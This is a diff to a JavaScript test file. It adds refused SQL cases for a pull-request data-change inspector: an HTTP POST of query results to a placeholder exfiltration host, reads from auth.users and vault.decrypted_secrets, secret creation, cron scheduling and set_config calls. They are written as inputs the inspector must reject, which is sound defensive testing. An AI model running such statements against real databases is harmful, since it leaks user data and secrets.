@@ -1116,7 +1116,7 @@ test('curated data-only inspection fails closed on SQL its detectors cannot see 
   const admitted = guarded.replace("$q$Bob's -- notes$q$", "'Bob''s -- notes'")
   assert.deepEqual(inspectPrCuratedDataChange(file(admitted)).row_writes, ['table core.property', 'table plm.licensing_write_authorization'])
   assert.deepEqual(inspectPrCuratedDataChange(file("insert into core.property (notes) values ($q$Bob's -- notes$q$);\n")).row_writes, ['table core.property'])
-  assert.deepEqual(inspectPrCuratedDataChange(file("update core.property set status = 'active' where id = 5 and licensor_id = -2 returning id;\ndelete from core.taxonomy_source_ref where entity_id = $1;\n")).row_writes, ['table core.property', 'table core.taxonomy_source_ref'])
+  assert.deepEqual(inspectPrCuratedDataChange(file("update core.property set status = 'active' where id = 5 and licensor_id = -2 returning id;\ndelete from core.taxonomy_source_ref where entity_id = 'e1';\n")).row_writes, ['table core.property', 'table core.taxonomy_source_ref'])
   const refused = [
     // round 1: dynamic DDL, destructive and maintenance statements, vacuous loads
     ["do $$ begin execute 'create table core.evil(id int)'; end $$;" + ins, /EXECUTE/],
@@ -1174,6 +1174,17 @@ test('curated data-only inspection fails closed on SQL its detectors cannot see 
     [ins + 'select lo_create(0);', /lo_create/],
     [ins + "select lo_write(1, 'x');", /lo_write/],
     ['insert into "CORE"."PROPERTY" (name) values (\'a\');', /outside curated Master Data/],
+    // round 5: expression calls are allowlisted, reads are confined, cron names forbidden
+    [ins + "select net.http_post('https://exfil.example/x', (select count(*) from core.property));", /net\.http_post is not an allowed/],
+    [ins + "select vault.create_secret('k', 'v');", /vault\.create_secret is not an allowed/],
+    [ins + 'select public.refresh_style_guide_library_default_snapshot();', /is not an allowed/],
+    [ins + "select http_get('https://x');", /http_get is not an allowed/],
+    [ins + 'select "anything"(1);', /is not an allowed/],
+    ['insert into core.property (name) select email from auth.users;', /read source auth\.users is outside/],
+    ['insert into core.property (name) select decrypted_secret from vault.decrypted_secrets;', /read source vault\.decrypted_secrets is outside/],
+    ["insert into core.property (name) select name from core.licensor l join public.profiles p on p.id = l.id;", /read source public\.profiles is outside/],
+    [ins + "select cron_schedule('j', '* * * * *', 'select 1');", /CRON_SCHEDULE/],
+    [ins + "select extensions.set_config('search_path', 'x', false);", /SET_CONFIG/],
     [ins + 'select "cron"."schedule"(\'j\', \'* * * * *\', \'select 1\');', /quoted identifier/],
   ]
   for (const [sql, pattern] of refused) {
